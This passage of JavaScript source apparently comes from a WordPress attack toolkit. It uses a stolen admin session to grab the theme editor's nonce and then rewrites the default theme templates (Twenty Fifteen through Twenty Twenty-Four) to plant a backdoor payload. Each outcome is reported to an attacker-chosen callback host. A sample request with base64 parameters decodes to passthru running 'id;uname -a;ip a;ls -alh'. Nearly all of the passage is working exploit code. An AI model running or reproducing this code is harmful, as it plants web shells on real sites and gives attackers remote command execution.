                        "%0A%0A%3F%3E%0A%0A%3C!--+wp%3Aheading+%7B%22level%22%3A1%7D+--%3E%0A%3Ch1+class%3D%22wp-block-heading%22+id%3D%22page-not-found%22%3E%3C%3Fphp+echo+esc_html_x(+'Page+Not+Found'%2C+'Heading+for+a+webpage+that+is+not+found'%2C+'twentytwentyfour'+)%3B+%3F%3E%3C%2Fh1%3E%0A%3C!--+%2Fwp%3Aheading+--%3E%0A%3C!--+wp%3Aparagraph+--%3E%0A%3Cp%3E%3C%3Fphp+echo+esc_html_x(+'The+page+you+are+looking+for+does+not+exist%2C+or+it+has+been+moved.+Please+try+searching+using+the+form+below.'%2C+'Message+to+convey+that+a+webpage+could+not+be+found'%2C+'twentytwentyfour'+)%3B+%3F%3E%3C%2Fp%3E%0A%3C!--+%2Fwp%3Aparagraph+--%3E%0A%3C!--+wp%3Apattern+%7B%22slug%22%3A%22twentytwentyfour%2Fhidden-search%22%7D+%2F--%3E%0A" +
                        "&action=edit-theme-plugin-file&file=patterns%2Fhidden-404.php&theme=twentytwentyfour&docs-list="
                    );

                    if (_stage2.responseText.match("File edited successfully")) {

                        if (Callback) {

                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyFour()",
                                        "Message": "[Sucessful] Stage 2 - Theme: TwentyTwentyThree has been Successfully Edited!",
                                        "About": [
                                            "If you're using the default backdoor embedded in the exploit, you can activate the backdoor functionality by accessing the TwentyTwentyFour endpoint: " + Target + "wp-content/themes/twentytwentyfour/patterns/hidden-404.php",
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                            "",
                                            "# HTTP Request Example #",
                                            "POST /wp-content/themes/twentytwentyfour/patterns/hidden-404.php HTTP/2",
                                            "Host: localhost",
                                            "Content-Type: application/x-www-form-urlencoded",
                                            "[\r\n]",
                                            "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                            ""
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                    } else {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyFour()",
                                        "Message": "[ERROR] Stage 2 - Unable to Edit (TwentyTwentyFour) Theme",
                                        "Date": new Date().toUTCString(),
                                        "About": encodeURIComponent(_stage2.responseText),
                                    }
                                )
                            );
                        }
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyFour()",
                                    "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_stage1.responseText)
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentyfour",
                                "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyFour()",
                                "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }
            }
        }

        // Wordpress 6.X.X and 5.X.X (TwentyTwentyOne) Theme.
        function TwentyTwentyOne() {

            if (Target.substr(-1) != '/') Target += '/';
            var _stage1 = new XMLHttpRequest();
            _stage1.open("GET", Target + "wp-admin/theme-editor.php?file=inc%2Fcustom-css.php&theme=twentytwentyone", false);
            _stage1.send();

            if (_stage1.responseText) {

                var csrf_token = _stage1.responseText.match(/<input[^>]*name="nonce"[^>]*value="([^"]+)"/)[1];

                if (csrf_token) {

                    var _stage2 = new XMLHttpRequest();
                    _stage2.open("POST", Target + "wp-admin/admin-ajax.php", false);
                    _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    _stage2.send(
                        "nonce=" + csrf_token +
                        "&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dinc%252Fcustom-css.php%26theme%3Dtwentytwentyone&newcontent=%3C%3Fphp%0A%2F**%0A+*+Custom+CSS%0A+*%0A+*+%40package+WordPress%0A+*+%40subpackage+Twenty_Twenty_One%0A+*+%40since+Twenty+Twenty-One+1.0%0A+*%2F%0A%0A%2F**%0A+*+Generate+CSS.%0A+*%0A+*+%40since+Twenty+Twenty-One+1.0%0A+*%0A+*+%40param+string+%24selector+The+CSS+selector.%0A+*+%40param+string+%24style++++The+CSS+style.%0A+*+%40param+string+%24value++++The+CSS+value.%0A+*+%40param+string+%24prefix+++The+CSS+prefix.%0A+*+%40param+string+%24suffix+++The+CSS+suffix.%0A+*+%40param+bool+++%24echo+++++Echo+the+styles.%0A+*+%40return+string%0A+*%2F%0Afunction+twenty_twenty_one_generate_css(+%24selector%2C+%24style%2C+%24value%2C+%24prefix+%3D+''%2C+%24suffix+%3D+''%2C+%24echo+%3D+true+)+%7B%0A%0A%09%2F%2F+Bail+early+if+there+is+no+%24selector+elements+or+properties+and+%24value.%0A%09if+(+!+%24value+%7C%7C+!+%24selector+)+%7B%0A%09%09return+''%3B%0A%09%7D%0A%0A%09%24css+%3D+sprintf(+'%25s+%7B+%25s%3A+%25s%3B+%7D'%2C+%24selector%2C+%24style%2C+%24prefix+.+%24value+.+%24suffix+)%3B%0A%0A%09if+(+%24echo+)+%7B%0A%09%09%2F*%0A%09%09+*+Note+to+reviewers%3A+%24css+contains+auto-generated+CSS.%0A%09%09+*+It+is+included+inside+%3Cstyle%3E+tags+and+can+only+be+interpreted+as+CSS+on+the+browser.%0A%09%09+*+Using+wp_strip_all_tags()+here+is+sufficient+escaping+to+avoid%0A%09%09+*+malicious+attempts+to+close+%3C%2Fstyle%3E+and+open+a+%3Cscript%3E.%0A%09%09+*%2F%0A%09%09echo+wp_strip_all_tags(+%24css+)%3B+%2F%2F+phpcs%3Aignore+WordPress.Security.EscapeOutput%0A%09%7D%0A%09return+%24css%3B%0A%7D%0A" +
                        encodeURIComponent(payload) +
                        "%0A%0A" +
                        "&action=edit-theme-plugin-file&file=inc%2Fcustom-css.php&theme=twentytwentyone&docs-list="
                    );

                    if (_stage2.responseText.match("File edited successfully")) {

                        if (Callback) {

                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyOne()",
                                        "Message": "[Sucessful] Stage 2 - Theme: TwentyTwentyOne has been Successfully Edited!",
                                        "About": [
                                            "If you're using the default backdoor embedded in the exploit, you can activate the backdoor functionality by accessing the TwentyTwentyOne endpoint: " + Target + "wp-content/themes/twentytwentytwo/inc/patterns/hidden-404.php",
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                            "",
                                            "# HTTP Request Example #",
                                            "POST /wp-content/themes/twentytwentyone/inc/custom-css.php HTTP/2",
                                            "Host: localhost",
                                            "Content-Type: application/x-www-form-urlencoded",
                                            "[\r\n]",
                                            "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                            ""
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                    } else {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyOne()",
                                        "Message": "[ERROR] Stage 2 - Unable to Edit (TwentyTwentyOne) Theme",
                                        "Date": new Date().toUTCString(),
                                        "About": encodeURIComponent(_stage2.responseText),
                                    }
                                )
                            );
                        }
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyOne()",
                                    "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_stage1.responseText)
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/theme-editor.php?file=inc%2Fcustom-css.php&theme=twentytwentyone",
                                "Module": "WPEditThemes.WPXEditThemes.TwentyTwentyOne()",
                                "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }
            }
        }

        // Wordpress 4.X.X (TwentySevenTeen) Theme.
        function TwentySevenTeen() {

            if (Target.substr(-1) != '/') Target += '/';
            var _stage1 = new XMLHttpRequest();
            _stage1.open("GET", Target + "wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen", false);
            _stage1.send();

            if (_stage1.responseText) {

                var csrf_token = _stage1.responseText.match(/<input[^>]*name="nonce"[^>]*value="([^"]+)"/)[1];

                if (csrf_token) {

                    var _stage2 = new XMLHttpRequest();
                    _stage2.open("POST", Target + "wp-admin/admin-ajax.php", false);
                    _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    _stage2.send(
                        "nonce=" + csrf_token +
                        "&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3D404.php%26theme%3Dtwentyseventeen&newcontent=%3C%3Fphp%0A%2F**%0A+*+The+template+for+displaying+404+pages+(not+found)%0A+*%0A+*+%40link+https%3A%2F%2Fcodex.wordpress.org%2FCreating_an_Error_404_Page%0A+*%0A+*+%40package+WordPress%0A+*+%40subpackage+Twenty_Seventeen%0A+*+%40since+1.0%0A+*+%40version+1.0%0A+*%2F%0A%0A" +
                        encodeURIComponent(payload) +
                        "%0A%0Aget_header()%3B+%3F%3E%0A%0A%3Cdiv+class%3D%22wrap%22%3E%0A%09%3Cdiv+id%3D%22primary%22+class%3D%22content-area%22%3E%0A%09%09%3Cmain+id%3D%22main%22+class%3D%22site-main%22+role%3D%22main%22%3E%0A%0A%09%09%09%3Csection+class%3D%22error-404+not-found%22%3E%0A%09%09%09%09%3Cheader+class%3D%22page-header%22%3E%0A%09%09%09%09%09%3Ch1+class%3D%22page-title%22%3E%3C%3Fphp+_e(+'Oops!+That+page+can%26rsquo%3Bt+be+found.'%2C+'twentyseventeen'+)%3B+%3F%3E%3C%2Fh1%3E%0A%09%09%09%09%3C%2Fheader%3E%3C!--+.page-header+--%3E%0A%09%09%09%09%3Cdiv+class%3D%22page-content%22%3E%0A%09%09%09%09%09%3Cp%3E%3C%3Fphp+_e(+'It+looks+like+nothing+was+found+at+this+location.+Maybe+try+a+search%3F'%2C+'twentyseventeen'+)%3B+%3F%3E%3C%2Fp%3E%0A%0A%09%09%09%09%09%3C%3Fphp+get_search_form()%3B+%3F%3E%0A%0A%09%09%09%09%3C%2Fdiv%3E%3C!--+.page-content+--%3E%0A%09%09%09%3C%2Fsection%3E%3C!--+.error-404+--%3E%0A%09%09%3C%2Fmain%3E%3C!--+%23main+--%3E%0A%09%3C%2Fdiv%3E%3C!--+%23primary+--%3E%0A%3C%2Fdiv%3E%3C!--+.wrap+--%3E%0A%0A%3C%3Fphp+get_footer()%3B%0A" +
                        "&action=edit-theme-plugin-file&file=404.php&theme=twentyseventeen&docs-list="
                    );

                    if (_stage2.responseText.match("File edited successfully")) {

                        if (Callback) {

                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentySevenTeen()",
                                        "Message": "[Sucessful] Stage 2 - Theme: TwentySevenTeen has been Successfully Edited!",
                                        "About": [
                                            "If you're using the default backdoor embedded in the exploit, you can activate the backdoor functionality by accessing the TwentySevenTeen endpoint: " + Target + "wp-content/themes/twentyseventeen/404.php",
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                            "",
                                            "# HTTP Request Example #",
                                            "POST /wp-content/themes/twentyseventeen/404.php HTTP/2",
                                            "Host: localhost",
                                            "Content-Type: application/x-www-form-urlencoded",
                                            "[\r\n]",
                                            "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                            ""
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                    } else {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentySevenTeen()",
                                        "Message": "[ERROR] Stage 2 - Unable to Edit (TwentySevenTeen) Theme",
                                        "Date": new Date().toUTCString(),
                                        "About": encodeURIComponent(_stage2.responseText),
                                    }
                                )
                            );
                        }
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Module": "WPEditThemes.WPXEditThemes.TwentySevenTeen()",
                                    "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_stage1.responseText)
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen",
                                "Module": "WPEditThemes.WPXEditThemes.TwentySevenTeen()",
                                "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }
            }
        }

        // Wordpress 4.X.X (TwentyFifteen) Theme.
        function TwentyFifteen() {

            if (Target.substr(-1) != '/') Target += '/';
            var _stage1 = new XMLHttpRequest();
            _stage1.open("GET", Target + "wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen", false);
            _stage1.send();

            if (_stage1.responseText) {

                var csrf_token = _stage1.responseText.match(/<input[^>]*name="nonce"[^>]*value="([^"]+)"/)[1];

                if (csrf_token) {

                    var _stage2 = new XMLHttpRequest();
                    _stage2.open("POST", Target + "wp-admin/admin-ajax.php", false);
                    _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    _stage2.send(
                        "nonce=" + csrf_token +
                        "&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3D404.php%26theme%3Dtwentyfifteen&newcontent=%3C%3Fphp%0A%2F**%0A+*+The+template+for+displaying+404+pages+(not+found)%0A+*%0A+*+%40package+WordPress%0A+*+%40subpackage+Twenty_Fifteen%0A+*+%40since+Twenty+Fifteen+1.0%0A+*%2F%0A%0A" +
                        encodeURIComponent(payload) +
                        "%0A%0Aget_header()%3B+%3F%3E%0A%0A%09%3Cdiv+id%3D%22primary%22+class%3D%22content-area%22%3E%0A%09%09%3Cmain+id%3D%22main%22+class%3D%22site-main%22+role%3D%22main%22%3E%0A%0A%09%09%09%3Csection+class%3D%22error-404+not-found%22%3E%0A%09%09%09%09%3Cheader+class%3D%22page-header%22%3E%0A%09%09%09%09%09%3Ch1+class%3D%22page-title%22%3E%3C%3Fphp+_e(+'Oops!+That+page+can%26rsquo%3Bt+be+found.'%2C+'twentyfifteen'+)%3B+%3F%3E%3C%2Fh1%3E%0A%09%09%09%09%3C%2Fheader%3E%3C!--+.page-header+--%3E%0A%0A%09%09%09%09%3Cdiv+class%3D%22page-content%22%3E%0A%09%09%09%09%09%3Cp%3E%3C%3Fphp+_e(+'It+looks+like+nothing+was+found+at+this+location.+Maybe+try+a+search%3F'%2C+'twentyfifteen'+)%3B+%3F%3E%3C%2Fp%3E%0A%0A%09%09%09%09%09%3C%3Fphp+get_search_form()%3B+%3F%3E%0A%09%09%09%09%3C%2Fdiv%3E%3C!--+.page-content+--%3E%0A%09%09%09%3C%2Fsection%3E%3C!--+.error-404+--%3E%0A%0A%09%09%3C%2Fmain%3E%3C!--+.site-main+--%3E%0A%09%3C%2Fdiv%3E%3C!--+.content-area+--%3E%0A%0A%3C%3Fphp+get_footer()%3B+%3F%3E%0A" +
                        "&action=edit-theme-plugin-file&file=404.php&theme=twentyfifteen&docs-list="
                    );

                    if (_stage2.responseText.match("File edited successfully")) {

                        if (Callback) {

                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentyFifteen()",
                                        "Message": "[Sucessful] Stage 2 - Theme: TwentyFifteen has been Successfully Edited!",
                                        "About": [
                                            "If you're using the default backdoor embedded in the exploit, you can activate the backdoor functionality by accessing the TwentyFifteen endpoint: " + Target + "wp-content/themes/twentyfifteen/404.php",
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                            "",
                                            "# HTTP Request Example #",
                                            "POST /wp-content/themes/twentyfifteen/404.php HTTP/2",
                                            "Host: localhost",
                                            "Content-Type: application/x-www-form-urlencoded",
                                            "[\r\n]",
                                            "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                            ""
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                    } else {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentyFifteen()",
                                        "Message": "[ERROR] Stage 2 - Unable to Edit (TwentyFifteen) Theme",
                                        "Date": new Date().toUTCString(),
                                        "About": encodeURIComponent(_stage2.responseText),
                                    }
                                )
                            );
                        }
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Module": "WPEditThemes.WPXEditThemes.TwentyFifteen()",
                                    "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_stage1.responseText)
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen",
                                "Module": "WPEditThemes.WPXEditThemes.TwentyFifteen()",
                                "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }
            }
        }

        // Wordpress 4.X.X (TwentySixteen) Theme.
        function TwentySixteen() {

            if (Target.substr(-1) != '/') Target += '/';
            var _stage1 = new XMLHttpRequest();
            _stage1.open("GET", Target + "wp-admin/theme-editor.php?file=404.php&theme=twentysixteen", false);
            _stage1.send();

            if (_stage1.responseText) {

                var csrf_token = _stage1.responseText.match(/<input[^>]*name="nonce"[^>]*value="([^"]+)"/)[1];

                if (csrf_token) {

                    var _stage2 = new XMLHttpRequest();
                    _stage2.open("POST", Target + "wp-admin/admin-ajax.php", false);
                    _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    _stage2.send(
                        "nonce=" + csrf_token +
                        "&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3D404.php%26theme%3Dtwentysixteen&newcontent=%3C%3Fphp%0A%2F**%0A+*+The+template+for+displaying+404+pages+(not+found)%0A+*%0A+*+%40package+WordPress%0A+*+%40subpackage+Twenty_Sixteen%0A+*+%40since+Twenty+Sixteen+1.0%0A+*%2F%0A%0A" +
                        encodeURIComponent(payload) +
                        "%0A%0Aget_header()%3B+%3F%3E%0A%0A%09%3Cdiv+id%3D%22primary%22+class%3D%22content-area%22%3E%0A%09%09%3Cmain+id%3D%22main%22+class%3D%22site-main%22+role%3D%22main%22%3E%0A%0A%09%09%09%3Csection+class%3D%22error-404+not-found%22%3E%0A%09%09%09%09%3Cheader+class%3D%22page-header%22%3E%0A%09%09%09%09%09%3Ch1+class%3D%22page-title%22%3E%3C%3Fphp+_e(+'Oops!+That+page+can%26rsquo%3Bt+be+found.'%2C+'twentysixteen'+)%3B+%3F%3E%3C%2Fh1%3E%0A%09%09%09%09%3C%2Fheader%3E%3C!--+.page-header+--%3E%0A%0A%09%09%09%09%3Cdiv+class%3D%22page-content%22%3E%0A%09%09%09%09%09%3Cp%3E%3C%3Fphp+_e(+'It+looks+like+nothing+was+found+at+this+location.+Maybe+try+a+search%3F'%2C+'twentysixteen'+)%3B+%3F%3E%3C%2Fp%3E%0A%0A%09%09%09%09%09%3C%3Fphp+get_search_form()%3B+%3F%3E%0A%09%09%09%09%3C%2Fdiv%3E%3C!--+.page-content+--%3E%0A%09%09%09%3C%2Fsection%3E%3C!--+.error-404+--%3E%0A%0A%09%09%3C%2Fmain%3E%3C!--+.site-main+--%3E%0A%0A%09%09%3C%3Fphp+get_sidebar(+'content-bottom'+)%3B+%3F%3E%0A%0A%09%3C%2Fdiv%3E%3C!--+.content-area+--%3E%0A%0A%3C%3Fphp+get_sidebar()%3B+%3F%3E%0A%3C%3Fphp+get_footer()%3B+%3F%3E%0A" +
                        "&action=edit-theme-plugin-file&file=404.php&theme=twentysixteen&docs-list="
                    );

                    if (_stage2.responseText.match("File edited successfully")) {

                        if (Callback) {

                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentySixteen()",
                                        "Message": "[Sucessful] Stage 2 - Theme: TwentySixteen has been Successfully Edited!",
                                        "About": [
                                            "If you're using the default backdoor embedded in the exploit, you can activate the backdoor functionality by accessing the TwentySixteen endpoint: " + Target + "wp-content/themes/twentysixteen/404.php",
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                            "",
                                            "# HTTP Request Example #",
                                            "POST /wp-content/themes/twentysixteen/404.php HTTP/2",
                                            "Host: localhost",
                                            "Content-Type: application/x-www-form-urlencoded",
                                            "[\r\n]",
                                            "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                            ""
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                    } else {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/admin-ajax.php",
                                        "Module": "WPEditThemes.WPXEditThemes.TwentySixteen()",
                                        "Message": "[ERROR] Stage 2 - Unable to Edit (TwentySixteen) Theme",
                                        "Date": new Date().toUTCString(),
                                        "About": encodeURIComponent(_stage2.responseText),
                                    }
                                )
                            );
                        }
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Module": "WPEditThemes.WPXEditThemes.TwentySixteen()",
                                    "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_stage1.responseText)
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/theme-editor.php?file=404.php&theme=twentysixteen",
                                "Module": "WPEditThemes.WPXEditThemes.TwentySixteen()",
                                "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }
            }
        }

    }
}

function CustomExploits() {

    /* ########################################################################################################### */
    // #   This CustomExploit function will contain exploits for vulnerabilities in third-party plugins/themes   # //
    /* ########################################################################################################### */

}
